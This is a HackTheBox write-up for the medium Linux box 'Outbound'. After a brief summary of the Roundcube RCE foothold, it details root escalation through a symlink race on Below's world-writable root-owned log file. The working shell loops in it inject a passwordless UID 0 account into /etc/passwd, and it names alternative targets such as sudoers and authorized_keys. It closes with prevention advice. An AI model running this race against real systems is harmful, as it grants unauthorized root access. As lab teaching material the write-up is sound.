Outbound

HackTheBox Writeup

Box Name: Outbound

Difficulty: Medium

OS: Linux (Ubuntu)

IP Address: 10.129.232.158

Summary

Outbound is a medium Linux box running Roundcube Webmail 1.6.10. Initial access comes from a post-auth RCE (CVE-2025-49113) using discovered credentials, giving a www-data shell. From there, database credentials in the Roundcube config allow decrypting stored session passwords, enabling lateral movement to jacob. Root is achieved by abusing a world-writable root-owned log file belonging to the Below monitoring tool via a symlink race condition (TOCTOU).

Privilege Escalation - Symlink Race Condition

Sudo Privileges Check

sudo -l
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
    !/usr/bin/below --debug*, !/usr/bin/below -d*

Jacob can run /usr/bin/below as root with restrictions on the --config, --debug, and -d flags.

Discovering the Vulnerability

Based on Mel's email hint, check Below's log directory:

ls -la /var/log/below/
-rw-rw-rw- 1 jacob jacob 236 Jul  8 20:45 error_jacob.log
-rw-rw-rw- 1 root  root    0 Jul 14 16:39 error_root.log    ← VULNERABLE!
drwxr-xr-x 2 root  root 4096 Oct 24 07:10 store

Critical finding: error_root.log is world-writable (0666), owned by root:root. This is a misconfiguration that allows symlink attacks.

Understanding the Symlink Attack

A root process (Below running via sudo) writes to error_root.log. The file is world-writable, so we can delete it, and the root process recreates it when writing. If we replace it with a symlink during the recreation window, root writes to our symlink target. Pointing it at /etc/passwd lets us append a UID 0 user with no password.

The Exploit

Step 1: Create Fake Passwd Entry

echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass

The :: empty password field means no password is required, and UID/GID 0 makes it a root account.

Step 2: Terminal 1 — Trigger Loop (Critical!)

Open a second SSH session as Jacob and constantly trigger Below to write errors, creating many race opportunities per second:

while true; do
  sudo /usr/bin/below dump system --snapshot /fakefile123 2>/dev/null
  sudo /usr/bin/below snapshot -b "1 hour ago" 2>/dev/null
  sleep 0.5
done

Step 3: Terminal 2 — Race Condition Loop

while true; do
  rm -f /var/log/below/error_root.log 2>/dev/null
  ln -s /etc/passwd /var/log/below/error_root.log 2>/dev/null
  cp /tmp/fakepass /var/log/below/error_root.log 2>/dev/null && echo "SUCCESS!" && break
  sleep 0.05
done

Step 4: Verify and Escalate

tail /etc/passwd | grep pwn
# pwn::0:0:pwn:/root:/bin/bash
su pwn
id
# uid=0(root) gid=0(root) groups=0(root)

Root Flag

cat /root/root.txt

Key Lessons & Indicators

This exploit is a classic TOCTOU (Time-Of-Check-Time-Of-Use) vulnerability: root checks whether error_root.log exists, we swap it for a symlink in the race window, and root then writes to the symlink target. To find these, look for world-writable files in privileged locations:

find / -type f -perm -0002 2>/dev/null | grep -vE 'proc|sys'

Red flags: world-writable files owned by root, log files with 0666/0777 permissions, predictable temp-file locations, and sudo privileges that run file-writing commands as root. Instead of /etc/passwd, the same primitive could target an SSH authorized_keys file, a sudoers.d drop-in, root's .bashrc, or /etc/shadow.

Prevention

  • Never make root-owned files world-writable — log files should be 0644 root:root.
  • Audit file permissions regularly in sensitive directories (find, lynis, AIDE/Tripwire).
  • Monitor for rapid symlink/file creation in /var/log with auditd.
  • Encrypt sensitive data properly — DES is weak, prefer AES-256.
  • Follow least privilege for sudo configurations.
